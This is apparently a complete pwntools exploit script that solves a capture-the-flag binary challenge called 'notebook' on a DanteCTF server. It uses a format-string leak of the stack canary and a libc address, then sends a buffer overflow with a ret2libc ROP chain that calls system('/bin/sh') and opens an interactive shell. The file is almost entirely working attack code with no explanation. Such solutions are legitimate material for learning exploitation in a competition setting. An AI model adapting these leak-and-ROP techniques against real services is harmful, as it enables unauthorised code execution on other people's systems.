#!/usr/bin/env python3

from pwn import *

exe = ELF("./notebook_patched")
libc = ELF("./libc.so.6", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.dantectf.it", 31530)

    return r


def insert_soul(index: int, name: bytes, circle: int, date: bytes):
    r.sendafter(b'> ', b'1')
    r.sendafter(b'Notebook position [1-5]: ', str(index).encode("ascii"))
    r.sendafter(b'Soul name: ', name)
    r.sendafter(b'Circle where I found him/her [1-9]: ', str(circle).encode("ascii"))
    r.sendafter(b'When I met him/her [dd/Mon/YYYY]: ', date)


def edit_soul(index: int, name: bytes, circle: int, date: bytes):
    r.sendafter(b'> ', b'3')
    r.sendafter(b'Notebook position [1-5]: ', str(index).encode("ascii"))
    r.sendafter(b'Soul name: ', name)
    r.sendafter(b'Circle where I found him/her [1-9]: ', str(circle).encode("ascii"))
    r.sendafter(b'When I met him/her [dd/Mon/YYYY]: ', date)


def view_soul(index: int):
    r.sendafter(b'> ', b'4')
    r.sendafter(b'Notebook position [1-5]: ', str(index).encode("ascii"))


def get_leaks():
    insert_soul(1, b'CCCCCCCCC', 2, b'02/Jun/2023')
    edit_soul(1, '|%9$p-%35$p'.rjust(30,'A').encode("ascii"), 2, b'03/Jun/2023')
    view_soul(1)

    r.recvuntil(b'Meeting date: ')
    r.recvuntil(b'AAAA|')
    canary = int(r.recvuntil(b'-', drop = True), 16)
    libc_leak = int(r.recvuntil(b'\n', drop = True), 16)
    return canary, libc_leak


def main():
    r = conn()

    canary, libc_leak = get_leaks()
    libc.address = libc_leak - (libc.sym.__libc_start_main + 139)
    log.info(f"canary: 0x{canary:x}")
    log.info(f"libc: 0x{libc.address:x}")    

    soul = b'04/Jun/2023\x00'
    offset = 40 - len(soul)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    bin_sh = next(libc.search(b"/bin/sh\x00"))

    payload = flat(
                soul,
                b"A" * offset,
                canary,
                0x0,
                pop_rdi,
                bin_sh,
                pop_rdi + 1,
                libc.sym.system
            )

    insert_soul(2, b'BBBBB', 2, payload)

    r.clean(0)
    r.interactive()


if __name__ == "__main__":
    main()
    